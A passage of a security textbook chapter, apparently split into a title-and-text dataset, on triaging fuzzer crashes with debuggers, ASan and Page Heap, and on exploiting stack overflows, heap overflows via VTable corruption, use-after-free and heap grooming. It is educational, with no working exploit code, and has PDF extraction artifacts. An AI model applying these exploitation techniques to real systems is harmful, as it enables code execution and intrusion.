    "output": "application will be. In many cases, inadequate checks are made at edge cases\nof protocol values, such as length values; then, if we already know how the\nprotocol is structured, we can generate our own test cases from scratch.\nGenerating our own test cases gives us precise control over the pro-\ntocol fields used and their sizes. However, test cases are more complex to\ndevelop, and careful thought must be given to the kinds you want to gener-\nate. Generating test cases allows you to test for types of protocol values that\nmight never be used when you capture traffic to mutate. But the advantage\nis that you’ll exercise more of the application’s code and access areas of\ncode that are likely to be less well tested.\nvulnerability triaging\nAfter you’ve run a fuzzer against a network protocol and the processing\napplication has crashed, you’ve almost certainly found a bug. The next step\nis to find out whether that bug is a vulnerability and what type of vulner-\nability it might be, which depends on how and why the application crashed.\nTo do this analysis, we use vulnerability triaging: taking a series of steps to\nsearch for the root cause of a crash. Sometimes the cause of the bug is clear\nand easy to track down. Sometimes a vulnerability causes corruption of an\napplication seconds, if not hours, after the corruption occurs. This section\ndescribes ways to triage vulnerabilities and increase your chances of finding\nthe root cause of a particular crash.\nDebugging Applications\nDifferent platforms allow different levels of control over your triaging. For an\napplication running on Windows, macOS, or Linux, you can attach a debug-\nger to the process. But on an embedded system, you might only have crash\nreports in the system log to go on. For debugging, I use CDB on Windows,\nGDB on Linux, and LLDB on macOS. All these debuggers are used from\nthe command line, and I’ll provide some of the most useful commands for\ndebugging your processes.\nStarting Debugging\nTo start debugging, you’ll first need to attach the debugger to the applica-\ntion you want to debug. You can either run the application directly under\nthe debugger from the command line or attach the debugger to an already-\nrunning process based on its process ID. Table 10-1 shows the various com-\nmands you need for running the three debuggers.\nTable 10-1: Commands for Running Debuggers on Windows, Linux, and macOS\nDebugger New process Attach process\nCDB cdb application.exe [arguments] cdb -p PID\nGDB gdb --args application [arguments] gdb -p PID\nLLDB lldb -- application [arguments] lldb -p -PID\n236 Chapter 10\nBecause the debugger will suspend execution of the process after\nyou’ve created or attached the debugger, you’ll need to run the process\nagain. You can issue the commands in Table 10-2 in the debugger’s shell\nto start the process execution or resume execution if attaching. The table\nprovides some simple names for such commands, separated by commas\nwhere applicable.\nTable 10-2: Simplified Application Execution Commands\nDebugger Start execution Resume execution\nCDB g g\nGDB run, r continue, c\nLLDB process launch, run, r thread continue, c\nWhen a new process creates a child process, it might be the child pro-\ncess that crashes rather than the process you’re debugging. This is espe-\ncially common on Unix-like platforms, because some network servers will\nfork the current process to handle the new connection by creating a copy\nof the process. In these cases, you need to ensure you can follow the child\nprocess, not the parent process. You can use the commands in Table 10-3\nto debug the child processes.\nTable 10-3: Debugging the Child Processes\nDebugger Enable child process debugging Disable child process debugging\nCDB .childdbg 1 .childdbg 0\nGDB set follow-fork-mode child set follow-fork-mode parent\nLLDB process attach --name NAME exit debugger\n--waitfor\nThere are some caveats to using these commands. On Windows with\nCDB, you can debug all processes from one debugger. However, with GDB,\nsetting the debugger to follow the child will stop the debugging of the parent.\nYou can work around this somewhat on Linux by using the set detach-on-fork\noff command. This command suspends debugging of the parent process\nwhile continuing to debug the child and then reattaches to the parent once\nthe child exits. However, if the child runs for a long time, the parent might\nnever be able to accept any new connections.\nLLDB does not have an option to follow child processes. Instead, you\nneed to start a new instance of LLDB and use the attachment syntax shown\nin Table 10-3 to automatically attach to new processes by the process name.\nYou should replace the NAME in the process LLDB command with the process\nname to follow.\nFinding and Exploiting Security Vulnerabilities 237\nAnalyzing the Crash\nAfter debugging, you can run the application while fuzzing and wait for\nthe program to crash. You should look for crashes that indicate corrupted\nmemory—for example, crashes that occur when trying to read or write to\ninvalid addresses, or trying to execute code at an invalid address. When\nyou’ve identified an appropriate crash, inspect the state of the application\nto work out the reason for the crash, such as a memory corruption or an\narray-indexing error.\nFirst, determine the type of crash that has occurred from the print\nout to the command window. For example, CDB on Windows typically\nprints the crash type, which will be something like Access violation, and\nthe debugger will try to print the instruction at the current program loca-\ntion where the application crashed. For GDB and LLDB on Unix-like sys-\ntems, you’ll instead see the signal type: the most common type is SIGSEGV\nfor segmentation fault, which indicates that the application tried to access\nan invalid memory location.\nAs an example, Listing 10-2 shows what you’d see in CDB if the applica-\ntion tried to execute an invalid memory address.\n(2228.1b44): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n00000000`41414141 ?? ???\nListing 10-2: An example crash in CDB showing invalid memory address\nAfter you’ve determined the type of crash, the next step is to determine\nwhich instruction caused the application to crash so you’ll know what in the\nprocess state you need to look up. Notice in Listing 10-2 that the debugger\ntried to print the instruction at which the crash occurred, but the memory\nlocation was invalid, so it returns a series of question marks. When the crash\noccurs due to reading or writing invalid memory, you’ll get a full instruction\ninstead of the question marks. If the debugger shows that you’re executing\nvalid instructions, you can disassemble the instructions surrounding the\ncrash location using the commands in Table 10-4.\nTable 10-4: Instruction Disassembly Commands\nDebugger Disassemble from crash location Disassemble a specific location\nCDB u u ADDR\nGDB disassemble disassemble ADDR\nLLDB disassemble –frame disassemble --start-address ADDR\nTo display the processor’s register state at the point of the crash, you\ncan use the commands in Table 10-5.\n238 Chapter 10\nTable 10-5: Displaying and Setting the Processor Register State\nDebugger Show general Show specific Set specific register\npurpose registers register\nCDB r r @rcx r @rcx = NEWVALUE\nGDB info registers info registers rcx set $rcx = NEWVALUE\nLLDB register read register read rcx register write rcx NEWVALUE\nYou can also use these commands to set the value of a register, which\nallows you to keep the application running by fixing the immediate crash\nand restarting execution. For example, if the crash occurred because the\nvalue of RCX was pointing to invalid reference memory, it’s possible to\nreset RCX to a valid memory location and continue execution. However,\nthis might not continue successfully for very long if the application is\nalready corrupted.\nOne important detail to note is how the registers are specified. In CDB,\nyou use the syntax @NAME to specify a register in an expression (for example,\nwhen building up a memory address). For GDB and LLDB, you typically use\n$NAME instead. GDB and LLDB, also have a couple of pseudo registers: $pc,\nwhich refers to the memory location of the instruction currently execut-\ning (which would map to RIP for x64), and $sp, which refers to the current\nstack pointer.\nWhen the application you’re debugging crashes, you’ll want to display\nhow the current function in the application was called, because this pro-\nvides important context to determine what part of the application triggered\nthe crash. Using this context, you can narrow down which parts of the pro-\ntocol you need to focus on to reproduce the crash.\nYou can get this context by generating a stack trace, which displays the\nfunctions that were called prior to the execution of the vulnerable function,\nincluding, in some cases, local variables and arguments passed to those func-\ntions. Table 10-6 lists commands to create a stack trace.\nTable 10-6: Creating a Stack Trace\nDebugger Display stack trace Display stack trace\nwith arguments\nCDB K Kb\nGDB backtrace backtrace full\nLLDB backtrace\nYou can also inspect memory locations to determine what caused the\ncurrent instruction to crash; use the commands in Table 10-7.\nFinding and Exploiting Security Vulnerabilities 239\nTable 10-7: Displaying Memory Values\nDebugger Display bytes/words, Display ten 1-byte values\ndwords, qwords\nCDB db, dw, dd, dq ADDR db ADDR L10\nGDB x/b, x/h, x/w, x/g ADDR x/10b ADDR\nLLDB memory read --size 1,2,4,8 memory read --size 1 --count 10\nEach debugger allows you to control how to display the values in mem-\nory, such as the size of the memory read (like 1 byte to 4 bytes) as well as\nthe amount of data to print.\nAnother useful command determines what type of memory an address\ncorresponds to, such as heap memory, stack memory, or a mapped execut-\nable. Knowing the type of memory helps narrow down the type of vulner-\nability. For example, if a memory value corruption has occurred, you can\ndistinguish whether you’re dealing with a stack memory or heap memory\ncorruption. You can use the commands in Table 10-8 to determine the\nlayout of the process memory and then look up what type of memory an\naddress corresponds to.\nTable 10-8: Commands for Displaying the Process Memory Map\nDebugger Display process memory map\nCDB !address\nGDB info proc mappings\nLLDB No direct equivalent\nOf course, there’s a lot more to the debugger that you might need to\nuse in your triage, but the commands provided in this section should cover\nthe basics of triaging a crash.\nExample Crashes\nNow let’s look at some examples of crashes so you’ll know what they look\nlike for different types of vulnerabilities. I’ll just show Linux crashes in\nGDB, but the crash information you’ll see on different platforms and\ndebuggers should be fairly similar. Listing 10-3 shows an example crash\nfrom a typical stack buffer overflow.\nGNU gdb 7.7.1\n(gdb) r\nStarting program: /home/user/triage/stack_overflow\nProgram received signal SIGSEGV, Segmentation fault.\n 0x41414141 in ?? ()\n (gdb) x/i $pc\n=> 0x41414141: Cannot access memory at address 0x41414141\n240 Chapter 10\n (gdb) x/16xw $sp-16\n0xbffff620: 0x41414141 0x41414141 0x41414141 0x41414141\n0xbffff630: 0x41414141 0x41414141 0x41414141 0x41414141\n0xbffff640: 0x41414141 0x41414141 0x41414141 0x41414141\n0xbffff650: 0x41414141 0x41414141 0x41414141 0x41414141\nListing 10-3: An example crash from a stack buffer overflow\nThe input data was a series of repeating A characters, shown here as\nthe hex value 0x41. At , the program has crashed trying to execute the\nmemory address 0x41414141. The fact that the address contains repeated\ncopies of our input data is indicative of memory corruption, because the\nmemory values should reflect the current execution state (such as pointers\ninto the stack or heap)and are very unlikely to be the same value repeated.\nWe double-check that the reason it crashed is that there’s no executable\ncode at 0x41414141 by requesting GDB to disassemble instructions at the\nlocation of the program crash . GDB then indicates that it cannot access\nmemory at that location. The crash doesn’t necessarily mean a stack over-\nflow has occured, so to confirm we dump the current stack location . By\nalso moving the stack pointer back 16 bytes at this point, we can see that\nour input data has definitely corrupted the stack.\nThe problem with this crash is that it’s difficult to determine which\npart is the vulnerable code. We crashed it by calling an invalid location,\nmeaning the function that was executing the return instruction is no lon-\nger directly referenced and the stack is corrupted, making it difficult to\nextract calling information. In this case, you could look at the stack mem-\nory below the corruption to search for a return address left on the stack\nby the vulnerable function, which can be used to track down the culprit.\nListing 10-4 shows a crash resulting from heap buffer overflow, which is\nconsiderably more involved than the stack memory corruption.\nuser@debian:~/triage$ gdb ./heap_overflow\nGNU gdb 7.7.1\n(gdb) r\nStarting program: /home/user/triage/heap_overflow\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804862b in main ()\n (gdb) x/i $pc\n=> 0x804862b <main+112>: mov (%eax),%eax\n (gdb) info registers $eax\neax 0x41414141 1094795585\n(gdb) x/5i $pc\n=> 0x804862b <main+112>: mov (%eax),%eax\n0x804862d <main+114>: sub $0xc,%esp\n0x8048630 <main+117>: pushl -0x10(%ebp)\n 0x8048633 <main+120>: call *%eax\n0x8048635 <main+122>: add $0x10,%esp\nFinding and Exploiting Security Vulnerabilities 241\n(gdb) disassemble\nDump of assembler code for function main:\n...\nx 0x08048626 <+107>: mov -0x10(%ebp),%eax\n0x08048629 <+110>: mov (%eax),%eax\n=> 0x0804862b <+112>: mov (%eax),%eax\n0x0804862d <+114>: sub $0xc,%esp\n0x08048630 <+117>: pushl -0x10(%ebp)\n0x08048633 <+120>: call *%eax\n(gdb) x/w $ebp-0x10\n0xbffff708: 0x0804a030\ny (gdb) x/4w 0x0804a030\n0x804a030: 0x41414141 0x41414141 0x41414141 0x41414141\n(gdb) info proc mappings\nprocess 4578\nMapped address spaces:\nStart Addr End Addr Size Offset objfile\n0x8048000 0x8049000 0x1000 0x0 /home/user/triage/heap_overflow\n0x8049000 0x804a000 0x1000 0x0 /home/user/triage/heap_overflow\nz 0x804a000 0x806b000 0x21000 0x0 [heap]\n0xb7cce000 0xb7cd0000 0x2000 0x0\n0xb7cd0000 0xb7e77000 0x1a7000 0x0 /lib/libc-2.19.so\nListing 10-4: An example crash from a heap buffer overflow\nAgain we get a crash, but it’s at a valid instruction that copies a value\nfrom the memory location pointed to by EAX back into EAX . It’s likely that\nthe crash occurred because EAX points to invalid memory. Printing the reg-\nister  shows that the value of EAX is just our overflow character repeated,\nwhich is a sign of corruption.\nWe disassemble a little further and find that the value of EAX is being\nused as a memory address of a function that the instruction at  will call.\nDereferencing a value from another value indicates that the code being\nexecuted is a virtual function lookup from a Virtual Function Table (VTable).\nWe confirm this by disassembling a few instructions prior to the crashing\ninstruction x. We see that a value is being read from memory, then that\nvalue is dereferenced (this would be reading the VTable pointer), and\nfinally it is dereferenced again causing the crash.\nAlthough analysis showing that the crash occurs when dereferencing a\nVTable pointer doesn’t immediately verify the corruption of a heap object,\nit’s a good indicator. To verify a heap corruption, we extract the value from\nmemory and check whether it’s corrupted using the 0x41414141 pattern,\nwhich was our input value during testing y. Finally, to check whether the\nmemory is in the heap, we use the info proc mappings command to dump\nthe process memory map; from that, we can see that the value 0x0804a030,\n242 Chapter 10"
  },
  {
    "input": "Improving Your Chances of Finding the Root Cause of a Crash",
    "output": "which we extracted for x, is within the heap region z. Correlating the\nmemory address with the mappings indicates that the memory corruption\nis isolated to this heap region.\nFinding that the corruption is isolated to the heap doesn’t necessarily\npoint to the root cause of the vulnerability, but we can at least find infor-\nmation on the stack to determine what functions were called to get to this\npoint. Knowing what functions were called would narrow down the range of\nfunctions you would need to reverse engineer to determine the culprit.\nImproving Your Chances of Finding the Root Cause of a Crash\nTracking down the root cause of a crash can be difficult. If the stack mem-\nory is corrupted, you lose the information on which function was being\ncalled at the time of the crash. For a number of other types of vulnerabili-\nties, such as heap buffer overflows or use-after-free, it’s possible the crash\nwill never occur at the location of the vulnerability. It’s also possible that\nthe corrupted memory is set to a value that doesn’t cause the application to\ncrash at all, leading to a change of application behavior that cannot easily\nbe observed through a debugger.\nIdeally, you want to improve your chances of identifying the exact point\nin the application that’s vulnerable without exerting a significant amount of\neffort. I’ll present a few ways of improving your chances of narrowing down\nthe vulnerable point.\nRebuilding Applications with Address Sanitizer\nIf you’re testing an application on a Unix-like OS, there’s a reasonable\nchance you have the source code for the application. This alone provides\nyou with many advantages, such as full debug information, but it also\nmeans you can rebuild the application and add improved memory error\ndetection to improve your chances of discovering vulnerabilities.\nOne of the best tools to add this improved functionality when rebuild-\ning is Address Sanitizer (ASan), an extension for the CLANG C compiler\nthat detects memory corruption bugs. If you specify the -fsanitize=address\noption when running the compiler (you can usually specify this option\nusing the CFLAGS environment variable), the rebuilt application will have\nadditional instrumentation to detect common memory errors, such as\nmemory corruption, out-of-bounds writes, use-after-free, and double-free.\nThe main advantage of ASan is that it stops the application as soon as\npossible after the vulnerable condition has occurred. If a heap allocation\noverflows, ASan stops the program and prints the details of the vulnerabil-\nity to the shell console. For example, Listing 10-5 shows a part of the output\nfrom a simple heap overflow.\n==3998==ERROR: AddressSanitizer: heap-buffer-overflow on address\n0xb6102bf4 at pc 0x081087ae bp 0xbf9c64d8 sp 0xbf9c64d0\nWRITE of size 1x at 0xb6102bf4 thread T0\nFinding and Exploiting Security Vulnerabilities 243\n#0 0x81087ad (/home/user/triage/heap_overflow+0x81087ad)\n#1 0xb74cba62 (/lib/i386-linux-gnu/i686/cmov/libc.so.6+0x19a62)\n#2 0x8108430 (/home/user/triage/heap_overflow +0x8108430)\nListing 10-5: Output from ASan for a heap buffer overflow\nNotice that the output contains the type of bug encountered  (in\nthis case a heap overflow), the memory address of the overflow write , the\nlocation in the application that caused the overflow , and the size of the\noverflow x. By using the provided information with a debugger, as shown in\nthe previous section, you should be able to track down the root cause of the\nvulnerability.\nHowever, notice that the locations inside the application are just mem-\nory addresses. Source code files and line numbers would be more useful.\nTo retrieve them in the stack trace, we need to specify some environment\nvariables to enable symbolization, as shown in Listing 10-6. The application\nwill also need to be built with debugging information, which we can do by\npassing by the compiler flag –g to CLANG.\n$ export ASAN_OPTIONS=symbolize=1\n$ export ASAN_SYMBOLIZER_PATH=/usr/bin/llvm-symbolizer-3.5\n$ ./heap_overflow\n=================================================================\n==4035==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb6202bf4 at\npc 0x081087ae bp 0xbf97a418 sp 0xbf97a410\nWRITE of size 1 at 0xb6202bf4 thread T0\n#0 0x81087ad in main /home/user/triage/heap_overflow.c:8:3\n#1 0xb75a4a62 in __libc_start_main /build/libc-start.c:287\n#2 0x8108430 in _start (/home/user/triage/heap_overflow+0x8108430)\nListing 10-6: Output from ASan for a heap buffer overflow with symbol information\nThe majority of Listing 10-6 is the same as Listing 10-5. The big dif-\nference is that the crash’s location  now reflects the location inside the\noriginal source code (in this case, starting at line 8, character 3 inside\nthe file heap_overflow.c) instead of a memory location inside the program.\nNarrowing down the location of the crash to a specific line in the program\nmakes it much easier to inspect the vulnerable code and determine the rea-\nson for the crash.\nWindows Debug and Page Heap\nOn Windows, access to the source code of the application you’re testing is\nprobably more restricted. Therefore, you’ll need to improve your chances\nfor existing binaries. Windows comes with the Page Heap, which you can\nenable to improve your chances of tracking down a memory corruption.\nYou need to manually enable the Page Heap for the process you want to\ndebug by running the following command as an administrator:\nC:\\> gflags.exe -i appname.exe +hpa\n244 Chapter 10"
  },
  {
    "input": "Exploiting Common Vulnerabilities",
    "output": "The gflags application comes installed with the CDB debugger. The\n–i parameter allows you to specify the image filename to enable the Page\nHeap on. Replace appname.exe with the name of the application you’re test-\ning. The +hpa parameter is what actually enables the Page Heap when the\napplication next executes.\nThe Page Heap works by allocating special, OS-defined memory pages\n(called guard pages) after every heap allocation. If an application tries to read\nor write these special guard pages, an error will be raised and the debugger\nwill be notified immediately, which is useful for detecting a heap buffer over-\nflow. If the overflow writes immediately at the end of the buffer, the guard\npage will be touched by the application and an error will be raised instantly.\nFigure 10-1 shows how this process works in practice.\nAllocated block Guard page Allocated block Guard page\nAllocated object Guard page Overflow buffer Guard page\nOverflow direction\nCrash\neax=05be3ffa ebx=00939000 ecx=000000ce edx=000000ee esi=05be3f2c edi=05be8000\neip=6a90cf5e esp=00b7f9ec ebp=00b7fa0c iopl=0 nv up ei pl nz na po cy\ncs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010203\nVCRUNTIME140!memcpy+0x4e:\n6a90cf5e f3a4 rep movs byte ptr es:[edi],byte ptr [esi]\nFigure 10-1: The Page Heap detecting an overflow\nYou might assume that using the Page Heap would be a good way of\nstopping heap memory corruptions from occurring, but the Page Heap\nwastes a huge amount of memory because each allocation needs a separate\nguard page. Setting up the guard pages requires calling a system call, which\nreduces allocation performance. On the whole, enabling the Page Heap for\nanything other than debugging sessions would not be a great idea.\nexploiting common vulnerabilities\nAfter researching and analyzing a network protocol, you’ve fuzzed it and\nfound some vulnerabilities you want to exploit. Chapter 9 describes many\ntypes of security vulnerabilities but not how to exploit those vulnerabilities,\nwhich is what I’ll discuss here. I’ll start with how you can exploit memory\ncorruptions and then discuss some of the more unusual vulnerability types.\nThe aims of vulnerability exploitation depend on the purpose of your\nprotocol analysis. If the analysis is on a commercial product, you might be\nFinding and Exploiting Security Vulnerabilities 245"
  },
  {
    "input": "Exploiting Memory Corruption Vulnerabilities ",
    "output": "looking for a proof of concept that clearly demonstrates the issue so the\nvendor can fix it: in that case, reliability isn’t as important as a clear demon-\nstration of what the vulnerability is. On the other hand, if you’re developing\nan exploit for use in a Red Team exercise and are tasked with compromis-\ning some infrastructure, you might need an exploit that is reliable, works on\nmany different product versions, and executes the next stage of your attack.\nWorking out ahead of time what your exploitation objectives are ensures\nyou don’t waste time on irrelevant tasks. Whatever your goals, this section\nprovides you with a good overview of the topic and more in-depth references\nfor your specific needs. Let’s begin with exploiting memory corruptions.\nExploiting Memory Corruption Vulnerabilities\nMemory corruptions, such as stack and heap overflows, are very common in\napplications written in memory-unsafe languages, such as C/C++. It’s diffi-\ncult to write a complex application in such programming languages without\nintroducing at least one memory corruption vulnerability. These vulner-\nabilities are so common that it’s relatively easy to find information about\nhow to exploit them.\nAn exploit needs to trigger the memory corruption vulnerability in\nsuch a way that the state of the program changes to execute arbitrary code.\nThis might involve hijacking the executing state of the processor and redi-\nrecting it to some executable code provided in the exploit. It might also\nmean modifying the running state of the application in such a way that pre-\nviously inaccessible functionality becomes available.\nThe development of the exploit depends on the corruption type and\nwhat parts of the running application the corruption affects, as well as the\nkind of anti-exploit mitigations the application uses to make exploitation of\na vulnerability more difficult to succeed. First, I’ll talk about the general prin-\nciples of exploitation, and then I’ll consider more complex scenarios.\nStack Buffer Overflows\nRecall that a stack buffer overflow occurs when code underestimates the\nlength of a buffer to copy into a location on the stack, causing overflow that\ncorrupts other data on the stack. Most serious of all, on many architectures\nthe return address for a function is stored on the stack, and corruption of\nthis return address gives the user direct control of execution, which you can\nuse to execute any code you like. One of the most common techniques to\nexploit a stack buffer overflow is to corrupt the return address on the stack\nto point to a buffer containing shell code with instructions you want to exe-\ncute when you achieve control. Successfully corrupting the stack in this way\nresults in the application executing code it was not expecting.\n246 Chapter 10\nIn an ideal stack overflow, you have full control over the contents and\nlength of the overflow, ensuring that you have full control over the values\nyou overwrite on the stack. Figure 10-2 shows an ideal stack overflow vulner-\nability in operation.\nUpper stack frame\nReturn address Shell code at address\n0x12345678\nStack buffer\nFinding and Exploiting Security Vulnerabilities 247\nnoitcerid\nwolfrevO\nUpper stack frame\nOverflowed\nstack buffer\n(cid:29)\n(cid:30) Return 0x12345678\n(cid:31)\nStack buffer\nLocal variables Local variables\nFigure 10-2: A simple stack overflow exploit\nThe stack buffer we’ll overflow is below the return address for the func-\ntion . When the overflow occurs, the vulnerable code fills up the buffer\nand then overwrites the return address with the value 0x12345678 . The\nvulnerable function completes its work and tries to return to its caller, but\nthe calling address has been replaced with an arbitrary value pointing\nto the memory location of some shell code placed there by the exploit .\nThe return instruction executes, and the exploit gains control over code\nexecution.\nWriting an exploit for a stack buffer overflow is simple enough in the\nideal situation: you just need to craft your data into the overflowed buffer to\nensure the return address points to a memory region you control. In some\ncases, you can even add the shell code to the end of the overflow and set\nthe return address to jump to the stack. Of course, to jump into the stack,\nyou’ll need to find the memory address of the stack, which might be possible\nbecause the stack won’t move very frequently.\nHowever, the properties of the vulnerability you discovered can create\nissues. For example, if the vulnerability is caused by a C-style string copy,\nyou won’t be able to use multiple 0 bytes in the overflow because C uses a\n0 byte as the terminating character for the string: the overflow will stop\nimmediately once a 0 byte is encountered in the input data. An alternative\nis to direct the shell code to an address value with no 0 bytes, for example,\nshell code that forces the application to do allocation requests.\nHeap Buffer Overflows\nExploiting heap buffer overflows can be more involved than exploiting an\noverflow on the stack because heap buffers are often in a less predictable\nmemory address. This means there is no guarantee you’ll find something\nas easily corruptible as the function return address in a known location.\nTherefore, exploiting a heap overflow requires different techniques, such\nas control of heap allocations and accurate placement of useful, corruptible\nobjects.\nThe most common technique for gaining control of code execution for\na heap overflow is to exploit the structure of C++ objects, specifically their\nuse of VTables. A VTable is a list of pointers to functions that the object\nimplements. The use of virtual functions allows a developer to make new\nclasses derived from existing base classes and override some of the func-\ntionality, as illustrated in Figure 10-3.\n(cid:30)p->Func1();\nmov ecx, [p]\nmov eax, [ecx + offset Func1]\n(cid:31)Object* p = new Object;\ncall eax\nVTable address Virtual Function 1\nVirtual Function 2\nObject data\nVirtual Function 3\nObject on the heap Virtual Function 4\nVTable in application\nFigure 10-3: VTable implementation\nTo support virtual functions, each allocated instance of a class must\ncontain a pointer to the memory location of the function table . When\na virtual function is called on an object, the compiler generates code that\nlooks up the address of the virtual function table, then looks up the virtual\nfunction inside the table, and finally calls that address . Typically, we can’t\ncorrupt the pointers in the table because it’s likely the table is stored in a\nread-only part of memory. But we can corrupt the pointer to the VTable\nand use that to gain code execution, as shown in Figure 10-4.\n248 Chapter 10\nVulnerable allocation\nShell code at address\nVTable address 0x44444444\n0x12345678\nOverflow\nObject data\nObject data\nVirtual Function 1 0x12345678\nVirtual Function 2 0x12345678\nVirtual Function 3 0x12345678\nVirtual Function 4 0x12345678\nVTable in application Fake VTable at\naddress 0x44444444\nFinding and Exploiting Security Vulnerabilities 249\n1\npaeH\n2\npaeH\n1\npaeH\n2\npaeH\nFigure 10-4: Gaining code execution through VTable address corruption\nUse-After-Free Vulnerability\nA use-after-free vulnerability is not so much a corruption of memory but\na corruption of the state of the program. The vulnerability occurs when a\nmemory block is freed but a pointer to that block is still stored by some part\nof the application. Later in the application’s execution, the pointer to the\nfreed block is reused, possibly because the application code assumes the\npointer is still valid. Between the time that the memory block is freed and\nthe block pointer is reused, there’s opportunity to replace the contents of the\nmemory block with arbitrary values and use that to gain code execution.\nWhen a memory block is freed, it will typically be given back to the\nheap to be reused for another memory allocation; therefore, as long as you\ncan issue an allocation request of the same size as the original allocation,\nthere’s a strong possibility that the freed memory block would be reused\nwith your crafted contents. We can exploit use-after-free vulnerabilities\nusing a technique similar to abusing VTables in heap overflows, as illus-\ntrated in Figure 10-5.\nThe application first allocates an object p on the heap , which con-\ntains a VTable pointer we want to gain control of. Next, the application\ncalls delete on the pointer to free the associated memory . However, the\napplication doesn’t reset the value of p, so this object is free to be reused in\nthe future.\n(cid:29)new byte[SIZE] = {...};\n// Later in execution\n(cid:31)Object* p = new Object; (cid:30)delete p; p->Func1();\np Other heap block p Other heap block p Other heap block\nVTable address 0x12345678\nFree memory\nObject data Arbitrary data\nOther heap block Other heap block Other heap block\nFigure 10-5: An example of a use-after-free vulnerability\nAlthough it’s shown in the figure as being free memory, the original\nvalues from the first allocation may not actually have been removed. This\nmakes it difficult to track down the root cause of a use-after-free vulnerabil-\nity. The reason is that the program might continue to work fine even if the\nmemory is no longer allocated, because the contents haven’t changed.\nFinally, the exploit allocates memory that is an appropriate size and has\ncontrol over the contents of memory that p points to, which the heap alloca-\ntor reuses as the allocation for p . If the application reuses p to call a vir-\ntual function, we can control the lookup and gain direct code execution.\nManipulating the Heap Layout\nMost of the time, the key to successfully exploiting a heap-based vulner-\nability is in forcing a suitable allocation to occur at a reliable location, so\nit’s important to manipulate the layout of the heap. Because there is such a\nlarge number of different heap implementations on various platforms, I’m\nonly able to provide general rules for heap manipulation.\nThe heap implementation for an application may be based on the vir-\ntual memory management features of the platform the application is exe-\ncuting on. For example, Windows has the API function VirtualAlloc, which\nallocates a block of virtual memory for the current process. However, using\nthe OS virtual memory allocator introduces a couple of problems:\nPoor performance Each allocation and free-up requires the OS to\nswitch to kernel mode and back again.\nWasted memory At a minimum, virtual memory allocations are done\nat page level, which is usually at least 4096 bytes. If you allocate memory\nsmaller than the page size, the rest of the page is wasted.\nDue to these problems, most heap implementations call on the OS ser-\nvices only when absolutely necessary. Instead, they allocate a large memory\nregion in one go and then implement user-level code to apportion that\nlarger allocation into small blocks to service allocation requests.\n250 Chapter 10\nEfficiently dealing with memory freeing is a further challenge. A\nnaive implementation might just allocate a large memory region and then\nincrement a pointer in that region for every allocation, returning the next\navailable memory location when requested. This will work, but it’s virtually\nimpossible to then free that memory: the larger allocation could only be\nfreed once all suballocations had been freed. This might never happen in\na long-running application.\nAn alternative to the simplistic sequential allocation is to use a free-list. A\nfree-list maintains a list of freed allocations inside a larger allocation. When\na new heap is created, the OS creates a large allocation in which the free-list\nwould consist of a single freed block the size of the allocated memory. When\nan allocation request is made, the heap’s implementation scans the list of free\nblocks looking for a free block of sufficient size to contain the allocation. The\nimplementation would then use that free block, allocate the request block at\nthe start, and update the free-list to reflect the new free size.\nWhen a block is freed, the implementation can add that block to the\nfree-list. It could also check whether the memory before and after the\nnewly freed block is also free and attempt to coalesce those free blocks\nto deal with memory fragmentation, which occurs when many small allo-\ncated blocks are freed, returning the blocks to available memory for reuse.\nHowever, free-list entries only record their individual sizes, so if an allocation\nlarger than any of the free-list entries is requested, the implementation might\nneed to further expand the OS allocated region to satisfy the request. An\nexample of a free-list is shown in Figure 10-6.\nFree-list Memory region\nFree block Free\n16 bytes\nFree block Allocated\n32 bytes\nFree block\nFree\n16 bytes\nFree block\nFree\n1024 bytes\nAllocated\nFree\nFigure 10-6: An example of a simple free-list implementation\nUsing this heap implementation, you should be able to see how you\nwould obtain a heap layout appropriate to exploiting a heap-based vulner-\nability. Say, for example, you know that the heap block you’ll overflow is\n128 bytes; you can find a C++ object with a VTable pointer that’s at least\nFinding and Exploiting Security Vulnerabilities 251\nthe same size as the overflowable buffer. If you force the application to\nallocate a large number of these objects, they’ll end up being allocated\nsequentially in the heap. You can selectively free one of these objects (it\ndoesn’t matter which one), and there’s a good chance that when you allo-\ncate the vulnerable buffer, it will reuse the freed block. Then you can exe-\ncute your heap buffer overflow and corrupt the allocated object’s VTable\nto get code execution, as illustrated in Figure 10-7.\nAllocated object Allocated object Allocated object Allocated object\nFree single object\nAllocated object Allocated object Free memory region Allocated object\nAllocate buffer\nAllocated object Allocated object Overflow buffer Allocated object\nOverflow direction\nFigure 10-7: Allocating memory buffers to ensure correct layout\nWhen manipulating heaps, the biggest challenge in a network attack\nis the limited control over memory allocations. If you’re exploiting a web\nbrowser, you can use JavaScript to trivially set up the heap layout, but for\na network application, it’s more difficult. A good place to look for object\nallocations is in the creation of a connection. If each connection is backed\nby a C++ object, you can control allocation by just opening and closing con-\nnections. If that method isn’t suitable, you’ll almost certainly have to exploit\nthe commands in the network protocol for appropriate allocations.\nDefined Memory Pool Allocations\nAs an alternative to using an arbitrary free-list, you might use defined mem-\nory pools for different allocation sizes to group smaller allocations appropri-\nately. For example, you might specify pools for allocations of 16, 64, 256, and\n1024 bytes. When the request is made, the implementation will allocate the\nbuffer based on the pool that most closely matches the size requested and is\nlarge enough to fit the allocation. For example, if you wanted a 50-byte alloca-\ntion, it would go into the 64-byte pool, whereas a 512-byte allocation would go\ninto the 1024-byte pool. Anything larger than 1024 bytes would be allocated\nusing an alternative approach for large allocations. The use of sized memory\npools reduces fragmentation caused by small allocations. As long as there’s a\nfree entry for the requested memory in the sized pool, it will be satisfied, and\nlarger allocations will not be blocked as much.\n252 Chapter 10"
  },
  {
    "input": "Arbitrary Memory Write Vulnerability",
